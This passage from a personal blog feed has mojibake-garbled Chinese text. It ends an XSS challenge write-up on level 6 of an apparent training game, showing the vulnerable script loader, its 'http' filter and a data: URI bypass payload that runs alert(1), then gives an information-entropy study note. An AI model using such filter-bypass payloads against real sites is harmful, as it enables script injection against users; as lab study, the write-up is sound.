function">getGadgetName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// Extra code so that we can communicate with the parent page</span>    window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>source <span class="token operator">==</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">includeGadget</span><span class="token punctuation">(</span><span class="token function">getGadgetName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level6.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cube<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/level6_cube.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>log<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Loading gadget...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>gadget.js</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">/* This is a completely awesome invisible gadget */</span></code></pre><p>å…³é”®ä»£ç </p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> scriptEl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// This will totally prevent us from loading evil URLs!</span><span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>               <span class="token string">"Sorry, cannot load a URL containing \"http\"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Load this awesome gadget</span>scriptEl<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span></code></pre><p>ç›´æ¥åŠ è½½å¤–éƒ¨è„šæœ¬ï¼Œå¦‚å›¾æ‰€ç¤º</p><img src="/article/xss/image-20210424165312513.png" class="" title="level6-1" loading="lazy"><p>æ—¢ç„¶æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œé‚£å°±ç›´æ¥ç”¨dataæ•°æ®æµåŠ è½½å³å¯</p><p>RFC2397å¯¹dataæ•°æ®æµæœ‰è¿‡å®šä¹‰ <a href="https://tools.ietf.org/html/rfc2397">https://tools.ietf.org/html/rfc2397</a></p><p><code>data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</code></p><p>payload:</p><pre class="language-none"><code class="language-none">data:text&#x2F;plain,alert(1);</code></pre><img src="/article/xss/image-20210424165650678.png" class="" title="level6-2" loading="lazy"><img src="/article/xss/image-20210424165707701.png" class="" title="level6-3" loading="lazy"><hr><p>å­¦ä¹ äº†åŸºæœ¬çš„Cross-site scripting (XSS)</p><p>è·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰æ˜¯ä¸€ä¸ªå®‰å…¨æ¼æ´ï¼Œå¯èƒ½ä¼šå½±å“ç½‘ç«™ã€‚ è¿™ä¸ªæ¼æ´å¯èƒ½ä½¿æ”»å‡»è€…å¯ä»¥å°†è‡ªå·±çš„æ¶æ„JavaScriptä»£ç æ·»åŠ åˆ°æ˜¾ç¤ºç»™ç”¨æˆ·çš„HTMLé¡µé¢ä¸Šã€‚ ä¸€æ—¦è¢«å®³è€…çš„æµè§ˆå™¨è®¿é—®ï¼Œæ­¤ä»£ç ä¾¿å¯ä»¥æ‰§è¡Œï¼Œæ”¹å˜ç½‘ç«™çš„è¡Œä¸ºæˆ–å¤–è§‚ï¼Œçªƒå–ç§äººæ•°æ®æˆ–ä»£è¡¨ç”¨æˆ·æ‰§è¡Œæ“ä½œç­‰ç­‰</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆç¬”è®° </category>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç†µå’Œä¿¡æ¯çš„å­¦ä¹ </title>
      <link href="article/entropy/"/>
      <url>article/entropy/</url>
      
        <content type="html"><![CDATA[<p>æ‘¸é±¼çš„å­¦ä¹ æ€»ç»“ï¼Œæä½œå“èµ›å¿…é¡»çš„ç†è®ºå­¦ä¹ â€¦</p><a id="more"></a><blockquote><p><strong>ä¿¡æ¯æ˜¯ä»å¤šä¸ªå¯èƒ½çŠ¶æ€ä¸­ç¡®å®šå®é™…çŠ¶æ€çš„ä»£ä»·</strong></p></blockquote><p>æœ‰äº›å¹³å°çš„å›ç­”æŒºå¥½çš„ï¼Œå»ºè®®çœ‹çœ‹å‚è€ƒé“¾æ¥</p><img src="/article/entropy/640" class="" title="Entropy" loading="lazy"><p><strong>ä¾‹å­ï¼šHow much is the shirt?</strong></p><p><strong>è¡¬è¡«çš„ä»·æ ¼æ˜¯9ç£…15ä¾¿å£«ï¼Œæ‰€ä»¥ä½ é€‰æ‹©Bé¡¹ï¼Œç­”æ¡ˆå´æ˜¯Cé¡¹ã€‚</strong></p><h2 id="ä¿¡æ¯ç†µ"><a href="#ä¿¡æ¯ç†µ" class="headerlink" title="ä¿¡æ¯ç†µ"></a>ä¿¡æ¯ç†µ</h2><p>å½“ä¸€ä»¶äº‹æƒ…(å®è§‚æ€)æœ‰å¾ˆå¤šç§å¯èƒ½çš„æƒ…å†µæ—¶ï¼Œè¿™ä»¶äº‹æƒ…(å®è§‚æ€)å¯¹æŸäºº(è§‚å¯Ÿè€…)è€Œè¨€å…·ä½“æ˜¯å“ªç§æƒ…å†µ(å¾®è§‚æ€)çš„ä¸ç¡®å®šæ€§å«åšç†µ.</p><p>å³è¿™(çŸ¥æƒ…æƒ…å†µçš„ä¸ç¡®å®šæ€§)å°±æ˜¯ç†µ</p><img src="/article/entropy/image-20210412143856985.png" class="" title="ç†µ" loading="lazy"><p>è€Œèƒ½<strong>æ¶ˆé™¤è¿™ç§ä¸ç¡®å®šæ€§çš„äº‹ç‰©</strong>å°±æ˜¯ä¿¡æ¯</p><img src="/article/entropy/image-20210412144408346.png" class="" title="ä¿¡æ¯" loading="lazy"><h2 id="ä¿¡æ¯é‡"><a href="#ä¿¡æ¯é‡" class="headerlink" title="ä¿¡æ¯é‡"></a>ä¿¡æ¯é‡</h2><p>ç†µå’Œä¿¡æ¯çš„å¢å‡æ•°é‡ç›¸ç­‰ï¼Œè·å–ä¿¡æ¯çš„åŒæ—¶ä¹Ÿä¼šæ¶ˆé™¤ä¸ç¡®å®šæ€§(ç†µ)</p><blockquote><p><strong>æ¶ˆé™¤</strong>ç†µ == <strong>è·å–</strong>ä¿¡æ¯</p></blockquote><p>ä¾‹å¦‚åœ¨ä¸¾ä¾‹ä¸­ï¼ŒABCDå››ä¸ªé€‰é¡¹å¯¹äºä¸çŸ¥é“æœ€ç»ˆç­”æ¡ˆçš„äººæ¥è¯´éƒ½æ˜¯ç­‰æ¦‚ç‡(25%)çš„ï¼Œç†µåœ¨æ­¤æ—¶(ç­‰æ¦‚ç‡)æœ€å¤§ã€‚</p><p>è€Œå‘Šè¯‰ä½ ç­”æ¡ˆæ˜¯Cçš„æ—¶å€™ï¼Œè¿™æ—¶ç†µæœ€å°ã€‚</p><p>èƒ½å¤Ÿæ¶ˆé™¤ç†µçš„ä¿¡æ¯æœ‰ä¸‰ç§ç±»å‹ï¼Œæœ¬è´¨éƒ½æ˜¯èƒ½å¤Ÿ<strong>æ­£ç¡®</strong>çš„è°ƒæ•´æ¯ä¸ªå¯èƒ½æƒ…å†µçš„æ¦‚ç‡ã€‚</p><p>å¦‚æœå‘Šè¯‰ä½ <code>&quot;ç­”æ¡ˆæ˜¯ABCDä¸­çš„ä¸€ä¸ª&quot;</code>åˆ™è·å–äº†0bitçš„ä¿¡æ¯ï¼Œè¿™ç§å®šä¹‰ä¸‹ï¼Œæ²¡æœ‰å‡ä¿¡æ¯çš„è¯´æ³•ã€‚åªæœ‰èƒ½æ¶ˆé™¤æŸäººå¯¹æŸäº‹ä¸ç¡®å®šæ€§çš„äº‹ç‰©æ‰å«åšä¿¡æ¯ï¼Œå³<code>&quot;ç­”æ¡ˆæ˜¯ABCDä¸­çš„ä¸€ä¸ª&quot;</code>ä¸æ˜¯ä¿¡æ¯</p><img src="/article/entropy/image-20210412152143538.png" class="" title="ABCD" loading="lazy"><p>è€Œå‘Šè¯‰ä½ <code>&quot;Aæ˜¯æ­£ç¡®ç­”æ¡ˆ&quot;</code>ä¹Ÿä¸æ˜¯ä¿¡æ¯(æ­£ç¡®ç­”æ¡ˆä¸ºC)ï¼Œå› ä¸ºå®ƒä¸æ˜¯æ­£ç¡®çš„ã€‚</p><img src="/article/entropy/image-20210412152302898.png" class="" title="A" loading="lazy"><h3 id="ç±»å‹ä¸€ï¼šè°ƒæ•´æ¦‚ç‡"><a href="#ç±»å‹ä¸€ï¼šè°ƒæ•´æ¦‚ç‡" class="headerlink" title="ç±»å‹ä¸€ï¼šè°ƒæ•´æ¦‚ç‡"></a>ç±»å‹ä¸€ï¼šè°ƒæ•´æ¦‚ç‡</h3><p>å¬å®Œå¬åŠ›åï¼Œä½ è·å–äº†ä¸€ä¸ªæ¶ˆæ¯â€è¡¬è¡«çš„ä»·æ ¼æ˜¯9ç£…15ä¾¿å£«â€ï¼Œä»è¿™ä¸ªæ¶ˆæ¯ä¸­å¼ ä¸‰å¾—çŸ¥<code>&quot;æœ‰ä¸€åŠå¯èƒ½æ˜¯Cé€‰é¡¹&quot;</code>ï¼Œè¿™ä¸ªä¿¡æ¯å°†Cé€‰é¡¹çš„æ¦‚ç‡æé«˜åˆ°äº†50%(æä¾›äº†0.21bits)</p><img src="/article/entropy/image-20210412153329273.png" class="" title="halfC" loading="lazy"><h3 id="ç±»å‹äºŒï¼šæ’é™¤å¹²æ‰°"><a href="#ç±»å‹äºŒï¼šæ’é™¤å¹²æ‰°" class="headerlink" title="ç±»å‹äºŒï¼šæ’é™¤å¹²æ‰°"></a>ç±»å‹äºŒï¼šæ’é™¤å¹²æ‰°</h3><p>å¬å®Œå¬åŠ›åï¼Œä½ è·å–äº†ä¸€ä¸ªæ¶ˆæ¯â€è¡¬è¡«çš„ä»·æ ¼æ˜¯9ç£…15ä¾¿å£«â€ï¼Œä»è¿™ä¸ªæ¶ˆæ¯ä¸­æå››å¾—çŸ¥<code>&quot;Bé€‰é¡¹æ˜¯é”™çš„&quot;</code>ï¼Œè¿™ä¸ªä¿¡æ¯ç›´æ¥å°†Bé€‰é¡¹æ¦‚ç‡é™ä½åˆ°0%(0.415bits)</p><img src="/article/entropy/image-20210412153709078.png" class="" title="exclueB" loading="lazy"><h3 id="ç±»å‹ä¸‰ï¼šç¡®å®šæƒ…å†µ"><a href="#ç±»å‹ä¸‰ï¼šç¡®å®šæƒ…å†µ" class="headerlink" title="ç±»å‹ä¸‰ï¼šç¡®å®šæƒ…å†µ"></a>ç±»å‹ä¸‰ï¼šç¡®å®šæƒ…å†µ</h3><p>å¬å®Œå¬åŠ›åï¼Œä½ è·å–äº†ä¸€ä¸ªæ¶ˆæ¯â€è¡¬è¡«çš„ä»·æ ¼æ˜¯9ç£…15ä¾¿å£«â€ï¼Œç‹äº”è‹±è¯­éå¸¸å¥½ï¼Œä»è¿™ä¸ªæ¶ˆæ¯ä¸­ç‹äº”ç›´æ¥å¾—çŸ¥<code>&quot;Cé€‰é¡¹æ˜¯æ­£ç¡®çš„&quot;</code>ï¼Œè¿™ä¸ªä¿¡æ¯ç›´æ¥å°†Cé€‰é¡¹æ¦‚ç‡æé«˜åˆ°100%(2bits)ï¼Œç›´æ¥ç¡®å®šäº†å®é™…æƒ…å†µã€‚</p><img src="/article/entropy/image-20210412180814429.png" class="" title="C" loading="lazy"><h2 id="ä¿¡æ¯çš„æ¥æ”¶"><a href="#ä¿¡æ¯çš„æ¥æ”¶" class="headerlink" title="ä¿¡æ¯çš„æ¥æ”¶"></a>ä¿¡æ¯çš„æ¥æ”¶</h2><h3 id="åª’ä»‹æ— å…³"><a href="#åª’ä»‹æ— å…³" class="headerlink" title="åª’ä»‹æ— å…³"></a>åª’ä»‹æ— å…³</h3><p><strong>åŒä¸€ä¸ªè§‚å¯Ÿè€…å¯¹åŒä¸€ä»¶äº‹æ¥å—åˆ°çš„ä¿¡æ¯ä¸ä¼ é€’ä¿¡æ¯çš„ä¿¡å·æ¨¡å¼æ— å…³</strong></p><p>ç‹äº”å†™çº¸æ¡ç»™èµµå…­<code>&quot;ç­”æ¡ˆæ˜¯C&quot;</code>ä¼ é€’çš„ä¿¡æ¯æ˜¯2bitsï¼Œç›´æ¥å‘Šè¯‰èµµå…­ä¼ é€’çš„ä¿¡æ¯ä¹Ÿæ˜¯2bitsï¼Œæ‰“ä¸‰ä¸ªå“æŒ‡(ä¸èµµå…­çº¦å®šå¥½ï¼Œèµµå…­èƒ½å¤Ÿç†è§£)ï¼Œä¼ é€’çš„ä¿¡æ¯ä¹Ÿæ˜¯2bits</p><h3 id="ç›¸å¯¹ä¸ªä½“"><a href="#ç›¸å¯¹ä¸ªä½“" class="headerlink" title="ç›¸å¯¹ä¸ªä½“"></a>ç›¸å¯¹ä¸ªä½“</h3><p><strong>æ¥æ”¶åˆ°çš„ä¿¡æ¯æ˜¯ç›¸å¯¹äºè§‚å¯Ÿè€…å·²ç»å¯¹è¯¥äº‹æƒ…çš„å®é™…äº†è§£ç¨‹åº¦è€Œè¨€çš„</strong></p><p>ç‹äº”ä¼šè¿™é“é¢˜ï¼Œç‹äº”å¯¹è¿™é“é¢˜çš„ç†µå°±ä¸º0bitï¼Œä¸ç®¡ç‹äº”æä¸å‘Šè¯‰èµµå…­æ­£ç¡®ç­”æ¡ˆæ˜¯Cï¼Œå› ä¸ºè§‚å¯Ÿè€…ç‹äº”å·²ç»æ‹¥æœ‰è¿™ä»¶äº‹çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå³ç‹äº”ç¡®å®š(çŸ¥é“)è¿™é“é¢˜çš„ç­”æ¡ˆæ˜¯Cï¼Œä¸ç¡®å®šæ€§ä»æœ€åˆå°±ä¸å­˜åœ¨ã€‚</p><p>èµµå…­ä¸ä¼šè¿™é“é¢˜ï¼Œæ‰€ä»¥èµµå…­å¯¹è¿™é“é¢˜çš„ç†µä¸º2bitsï¼Œå› ä¸ºè§‚å¯Ÿè€…èµµå…­æ²¡æœ‰å¯¹äºè¿™ä»¶äº‹çš„ä»»ä½•ä¿¡æ¯ã€‚</p><p>å¯¹äºæå››è€Œè¨€ï¼Œç‹äº”å‘Šè¯‰å¼ ä¸‰<code>&quot;ç­”æ¡ˆæ˜¯C&quot;</code>ï¼Œæä¾›ç»™æå››1.58bitsä¿¡æ¯ï¼Œå› ä¸ºè§‚å¯Ÿè€…æå››çŸ¥é“Bæ˜¯é”™çš„ï¼Œè§‚å¯Ÿè€…æ‹¥æœ‰å…³äºè¿™ä»¶äº‹æƒ…çš„éƒ¨åˆ†ä¿¡æ¯ã€‚</p><p>èµµå…­è®¤ä¸ºCæ˜¯é”™çš„ï¼Œå†å‘Šè¯‰èµµå…­ç­”æ¡ˆæ˜¯Cï¼Œç†µä¸ä¼šå‡å°‘ï¼Œå› ä¸ºæ²¡æœ‰å®é™…å¸®åŠ©èµµå…­æ¶ˆé™¤äº‹æƒ…çš„ä¸ç¡®å®šæ€§ï¼Œå› ä¸ºç†µä¸ä¼šéšç€ä¸»è§‚è‡†æƒ³è€Œå‡å°‘ï¼Œä¿¡æ¯ä¹Ÿä¸éšä¸»è§‚æ„è¯†è€Œæ”¹å˜ã€‚</p><h3 id="ç›¸å¯¹äº‹ä»¶"><a href="#ç›¸å¯¹äº‹ä»¶" class="headerlink" title="ç›¸å¯¹äº‹ä»¶"></a>ç›¸å¯¹äº‹ä»¶</h3><p><code>&quot;å¤ªé˜³ä¸œå‡è¥¿è½&quot;</code>ï¼Œè¿™å¥è¯å¯¹çŸ¥é“çš„äººæä¾›0bitä¿¡æ¯ï¼Œå¯¹çŸ¥é“æˆ–ä¸œæˆ–è¥¿å‡èµ·çš„äººæä¾›äº†1bitä¿¡æ¯ï¼Œå¯¹è®¤ä¸ºä¸œå—è¥¿åŒ—éƒ½å¯èƒ½å‡èµ·çš„äººæä¾›äº†2bitsä¿¡æ¯</p><img src="/article/entropy/image-20210412204545002.png" class="" title="ä¸œå—è¥¿åŒ—" loading="lazy"><h2 id="ä¿¡æ¯é‡çš„è®¡ç®—"><a href="#ä¿¡æ¯é‡çš„è®¡ç®—" class="headerlink" title="ä¿¡æ¯é‡çš„è®¡ç®—"></a>ä¿¡æ¯é‡çš„è®¡ç®—</h2><p>ä¿¡æ¯ä¹Ÿæ˜¯ç‰©ç†é‡ï¼Œç±»ä¼¼äº<code>åƒå…‹</code>ï¼Œé€‰ç§åƒå…‹ä¸ºå•ä½ç‰©ç†é‡ï¼Œåˆ™æµ‹é‡å…¶ä»–ç‰©ä½“çš„è´¨é‡å°±æ˜¯ä»¥å¤šå°‘ä¸ªå•ä½è´¨é‡ï¼Œå³å¤šå°‘åƒå…‹æ¥è®¡ç®—ã€‚</p><p>ä¿¡æ¯ä¹Ÿæ˜¯å‚ç…§å•ä½äº‹ä»¶çš„ä¸ç¡®å®šæ€§ï¼Œçœ‹çœ‹å¾…æµ‹äº‹ä»¶çš„ä¸ç¡®å®šæ€§ç›¸å½“äºâ€å¤šå°‘ä¸ªâ€å‚ç…§äº‹ä»¶çš„ä¸ç¡®å®šæ€§ï¼Œå…¶ä¸­â€å¤šå°‘ä¸ªâ€ï¼Œä¾¿æ˜¯ä¿¡æ¯é‡ã€‚</p><p>å¦‚æœé€‰æ‹©å‚ç…§äº‹ä»¶åƒæ˜¯æŠ›ç¡¬å¸è¿™æ ·50%ä¸¤ç§ç­‰æ¦‚ç‡æƒ…å†µçš„äº‹ä»¶æ—¶ï¼Œæµ‹é‡çš„ä¿¡æ¯é‡çš„å•ä½å°±ç§°ä¸ºæ¯”ç‰¹(bit)ã€‚</p><p>æµ‹é‡è´¨é‡æ˜¯ï¼Œå¯ä»¥ç”¨å¾…æµ‹ç‰©ä½“è´¨é‡mé™¤ä»¥å‚ç…§ç‰©ä½“è´¨é‡Bï¼Œå› ä¸ºå¾…æµ‹ç‰©ä½“è´¨é‡m=å‚ç…§ç‰©ä½“è´¨é‡B ä¹˜ å‚ç…§ç‰©ä½“ä¸ªæ•°nï¼Œæ‰€ä»¥çŸ¥é“æ€»è´¨é‡m æ±‚ ä¸ªæ•° n æ—¶ï¼Œåˆ©ç”¨é™¤æ³•è®¡ç®—å³å¯ã€‚</p><p>å¯æ˜¯æµ‹é‡ä¿¡æ¯æ—¶å´ä¸èƒ½ç”¨é™¤æ³•ï¼Œå› ä¸ºæŠ›ä¸‰æšç¡¬å¸äº§ç”Ÿçš„ç­‰å¯èƒ½ç»“æœå¹¶é $3*2=6ç§$ï¼Œè€Œæ˜¯ $2^3=8ç§$</p><p><code>[æ­£æ­£æ­£,æ­£æ­£å,æ­£åæ­£,æ­£åå,åæ­£æ­£,åæ­£å,ååæ­£,ååå]</code></p><p>ä¸æ˜¯çº¿æ€§å…³ç³»ï¼Œè€Œæ˜¯æŒ‡æ•°å…³ç³»ï¼Œæ‰€ä»¥å½“çŸ¥é“å¯èƒ½æƒ…å†µä¸ªæ•°mï¼Œæƒ³æ±‚è¿™äº›æƒ…å†µç›¸å½“äºå¤šå°‘ä¸ªnå‚ç…§äº‹ä»¶äº§ç”Ÿçš„æ—¶ï¼Œå°±ç”¨å¯¹æ•°è¿ç®—å³å¯ã€‚</p><p>$$ m = 2^n $$</p><p>$$ n = log_2m $$</p><p>æ‰€ä»¥å¯¹ç­”æ¡ˆABCDé‡Œå“ªä¸€é€‰é¡¹çš„ä¸ç¡®å®šæ€§å³ä¸º<br>$$ log_24 = 2 bits $$<br>è¿™ç§æƒ…å†µå› ä¸ºæ¯ä¸ªé€‰é¡¹éƒ½æ˜¯25%çš„ç­‰æ¦‚ç‡æ‰å¯ä»¥ï¼Œä¸æŠ›ç¡¬å¸ä¸€æ ·ï¼Œå‡ºç°æ­£åçš„æ¦‚ç‡éƒ½æ˜¯ç›¸ç­‰çš„50%</p><img src="/article/entropy/image-20210413213110288.png" class="" width="24" loading="lazy"><p>å¯å¼ ä¸‰çŸ¥é“æœ‰ä¸€åŠå¯èƒ½æ˜¯Cé€‰é¡¹æ—¶ï¼Œå„ä¸ªæƒ…å†µçš„æ¦‚ç‡å°±ä¸ä¸€æ ·äº†ã€‚è¿™æ—¶è¦åˆ†åˆ«æµ‹é‡å¾…æµ‹äº‹ä»¶æ¯ç§å¯èƒ½çš„ä¿¡æ¯é‡åä¹˜å®ƒä»¬å„è‡ªå‘ç”Ÿçš„æ¦‚ç‡å†ç›¸åŠ å³å¯ã€‚</p><img src="/article/entropy/image-20210413213513800.png" class="" title="log2" loading="lazy"><p>ä¸è¿‡æˆ‘ä»¬ä¸çŸ¥é“æ¦‚ç‡ä¸º1/6çš„æƒ…å†µçš„ä¸ç¡®å®šæ€§ç›¸å½“äºæŠ›å¤šå°‘ä¸ªç¡¬å¸æ‰€äº§ç”Ÿçš„ä¸ç¡®å®šæ€§ï¼ŒmæœªçŸ¥å°±æ²¡æ³•ç”¨è¿™ä¸ªå…¬å¼</p><p>$$ log_2m_A $$</p><p>ä½†1%ä¼šå‘ç”Ÿçš„æƒ…å†µç›¸å½“äºä»100ä¸ªç­‰æ¦‚ç‡æƒ…å†µä¸­ç¡®å®šå®é™…æƒ…å†µï¼Œè€Œæ¦‚ç‡çš„å€’æ•°=ç­‰æ¦‚ç‡æƒ…å†µçš„ä¸ªæ•°</p><p>$$ p = 1/100 $$<br>$$ 100 = 1/p $$</p><p>ç”¨æ¦‚ç‡çš„å€’æ•°1/pæ›¿æ¢ç­‰æ¦‚ç‡æƒ…å†µä¸ªæ•°måå°±å¯ä»¥è®¡ç®—æ¯ç§æƒ…å†µçš„ä¿¡æ¯é‡äº†</p><p>$$ m = 1/p $$</p><img src="/article/entropy/image-20210413214141284.png" class="" title="p1" loading="lazy"><p>å†å°†æ¯ä¸ªæƒ…å†µçš„ä¿¡æ¯é‡ä¹˜å¯¹åº”å‘ç”Ÿçš„æ¦‚ç‡å†ç›¸åŠ ï¼Œå°±èƒ½ç®—å‡ºæ€»ä¿¡æ¯é‡äº†</p><p>$$ P_A: 1/6 log_2(6/1) = 0.43 bits $$</p><p>$$ P_b:1/6 log_2(6/1) = 0.43 bits $$</p><p>$$ P_c:1/2 log_2(2/1) = 0.5 bits $$</p><p>$$ P_d:1/6 log_2(6/1) = 0.43 bits $$</p><p>å¼ ä¸‰å¾—çŸ¥<code>&quot;æœ‰ä¸€åŠå¯èƒ½æ˜¯Cé€‰é¡¹&quot;</code>åçš„ä¸ç¡®å®šæ€§(ç†µ)ä¸º $1.79 bits$</p><p>$$ P_a+P_b+P_c+P_d = 1.79 bits $$</p><p>å‘Šè¯‰å¼ ä¸‰<code>&quot;æœ‰ä¸€åŠå¯èƒ½æ˜¯Cé€‰é¡¹&quot;</code>åæä¾›çš„ä¿¡æ¯ä¸º $2-1.79=0.21 bits$</p><h3 id="å‡åŒ€åˆ†å¸ƒ"><a href="#å‡åŒ€åˆ†å¸ƒ" class="headerlink" title="å‡åŒ€åˆ†å¸ƒ"></a>å‡åŒ€åˆ†å¸ƒ</h3><p>$$ log_2m $$</p><h3 id="ä¸€èˆ¬åˆ†å¸ƒ"><a href="#ä¸€èˆ¬åˆ†å¸ƒ" class="headerlink" title="ä¸€èˆ¬åˆ†å¸ƒ"></a>ä¸€èˆ¬åˆ†å¸ƒ</h3><p>$$ \sum p_i log_2 p_i^{-1} $$</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.zhihu.com/question/22178202">çŸ¥ä¹:ä¿¡æ¯ç†µæ˜¯ä»€ä¹ˆï¼Ÿ</a></p><p><a href="https://mp.weixin.qq.com/s/toPBIMFPKG0FNzkKu2owfw">å¾®ä¿¡å…¬ä¼—å·:è¶…æ™ºèƒ½ä½“ ä¿¡æ¯è®º</a></p><p><a href="https://kns.cnki.net/kcms/detail/detail.aspx?filename=WJFZ202010024&dbcode=CJFQ&dbname=CJFD2020&v=f5iFxWNeOELznrq%25mmd2BGTndyblA9BGrQdi6BASTgoipwWx5vvgdZDVsk9Y0pGb3T8Ra">é©¬çŒ›é£,çŸ³ä¹ä¹‰,é­ä¸œå¹³,å¾å…´å.åŸºäºä¿¡æ¯ç†µçš„åˆ†å¸ƒå¼WebæœåŠ¡ç§»åŠ¨ç›®æ ‡é˜²å¾¡æ–¹æ¡ˆ[J].è®¡ç®—æœºæŠ€æœ¯ä¸å‘å±•,2020,30(10):131-136.</a></p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆç¬”è®° </category>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker-php+mysqlé…ç½®debugç¯å¢ƒ</title>
      <link href="article/phpstormdebug/"/>
      <url>article/phpstormdebug/</url>
      
